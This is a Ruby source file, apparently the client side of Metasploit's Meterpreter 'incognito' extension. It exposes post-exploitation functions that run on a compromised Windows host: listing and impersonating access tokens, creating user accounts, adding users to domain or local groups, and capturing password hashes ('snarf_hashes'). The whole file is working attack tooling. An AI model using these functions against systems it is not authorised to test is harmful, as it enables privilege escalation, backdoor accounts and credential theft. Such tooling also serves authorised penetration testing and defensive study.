# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/incognito/tlv'
require 'rex/post/meterpreter/extensions/incognito/command_ids'

module Rex
module Post
module Meterpreter
module Extensions
module Incognito

###
#
# This meterpreter extensions a privilege escalation interface that is capable
# of doing things like dumping password hashes and performing local
# exploitation.
#
###
class Incognito < Extension

  def self.extension_id
    EXTENSION_ID_INCOGNITO
  end

  def initialize(client)
    super(client, 'incognito')

    client.register_extension_aliases(
      [
        {
          'name' => 'incognito',
          'ext'  => self
        },
      ])
  end

  def incognito_list_tokens(token_order)
    request = Packet.create_request(COMMAND_ID_INCOGNITO_LIST_TOKENS)
    request.add_tlv(TLV_TYPE_INCOGNITO_LIST_TOKENS_ORDER, token_order)

    response = client.send_request(request)

    {
      'delegation' => response.get_tlv_value(TLV_TYPE_INCOGNITO_LIST_TOKENS_DELEGATION),
      'impersonation' => response.get_tlv_value(TLV_TYPE_INCOGNITO_LIST_TOKENS_IMPERSONATION)
    }
  end

  def incognito_impersonate_token(username)
    request = Packet.create_request(COMMAND_ID_INCOGNITO_IMPERSONATE_TOKEN)
    request.add_tlv(TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN, username)
    response = client.send_request(request)

    response.get_tlv_value(TLV_TYPE_INCOGNITO_GENERIC_RESPONSE)
  end

  def incognito_add_user(host, username, password)
    request = Packet.create_request(COMMAND_ID_INCOGNITO_ADD_USER)
    request.add_tlv(TLV_TYPE_INCOGNITO_USERNAME, username)
    request.add_tlv(TLV_TYPE_INCOGNITO_PASSWORD, password)
    request.add_tlv(TLV_TYPE_INCOGNITO_SERVERNAME, host)
    response = client.send_request(request)

    response.get_tlv_value(TLV_TYPE_INCOGNITO_GENERIC_RESPONSE)
  end

  def incognito_add_group_user(host, groupname, username)
    request = Packet.create_request(COMMAND_ID_INCOGNITO_ADD_GROUP_USER)
    request.add_tlv(TLV_TYPE_INCOGNITO_USERNAME, username)
    request.add_tlv(TLV_TYPE_INCOGNITO_GROUPNAME, groupname)
    request.add_tlv(TLV_TYPE_INCOGNITO_SERVERNAME, host)
    response = client.send_request(request)

    response.get_tlv_value(TLV_TYPE_INCOGNITO_GENERIC_RESPONSE)
  end

  def incognito_add_localgroup_user(host, groupname, username)
    request = Packet.create_request(COMMAND_ID_INCOGNITO_ADD_LOCALGROUP_USER)
    request.add_tlv(TLV_TYPE_INCOGNITO_USERNAME, username)
    request.add_tlv(TLV_TYPE_INCOGNITO_GROUPNAME, groupname)
    request.add_tlv(TLV_TYPE_INCOGNITO_SERVERNAME, host)
    response = client.send_request(request)

    response.get_tlv_value(TLV_TYPE_INCOGNITO_GENERIC_RESPONSE)
  end

  def incognito_snarf_hashes(host)
    request = Packet.create_request(COMMAND_ID_INCOGNITO_SNARF_HASHES)
    request.add_tlv(TLV_TYPE_INCOGNITO_SERVERNAME, host)
    client.send_request(request)

    true
  end

end

end; end; end; end; end
